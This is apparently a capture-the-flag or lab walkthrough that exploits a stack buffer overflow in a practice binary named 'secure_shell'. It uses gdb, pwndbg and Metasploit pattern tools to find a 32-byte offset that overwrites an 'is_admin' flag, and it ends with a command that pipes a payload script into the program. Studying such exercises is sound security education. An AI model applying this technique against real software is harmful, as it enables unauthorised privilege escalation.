### Identification

Run the application and see that it asks for user input:
```
$ ./secure_shell
Please enter secure shell password:
hello
Access denied
user@7ea4c3f8c
```

Let's try piping a large string as user input:

```
$ python3 -c 'print("A" * 64)' | ./secure_shell
Please enter secure shell password:
Access denied
Segmentation fault
```

As it segfaults with large user input values, let's investigate a potential buffer overflow.

### gdb

Run the application with gdb:
```
gdb ./secure_shell
```

Checking the security settings to confirm there's no stack canaries:

```
pwndbg> checksec
[*] '/home/user/app/secure_shell'
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

We can also use `info file` to see more about the file type, elf32-i386.
We could also have used `file` on the binary to see the similar information:
```
$ file ./secure_shell
./secure_shell: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV),
dynamically linked, interpreter /lib/ld-linux.so.2,
BuildID[sha1]=72f83d4b511b8241034ad220114c516414fbbefc,
for GNU/Linux 3.2.0, with debug_info, not stripped
```


We can see the available functions in the binary by examining the symbol table:
```
$ info functions
```

We can either explicitly put a breakpoint in main and run:
```
b *main
run
```

Or just use the `start` command.

### Calculating buffer size

If we didn't know the buffer size we can create an arbitrary length value:

```
ruby  ./tools/exploit/pattern_create.rb -l 50
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
```

Find the value of admin:
```
p/x is_admin
$6 = 0x31624130
```

Find the buffer size:
```
ruby  ./tools/exploit/pattern_offset.rb -l 50 -q 0x31624130
[*] Exact match at offset 32
```

So we can write 32 characters before hitting the `is_admin` value in the stack.

### Final

Remember to keep stdin open:
```
(python3 override.py; echo ''; cat) | ./secure_shell
```
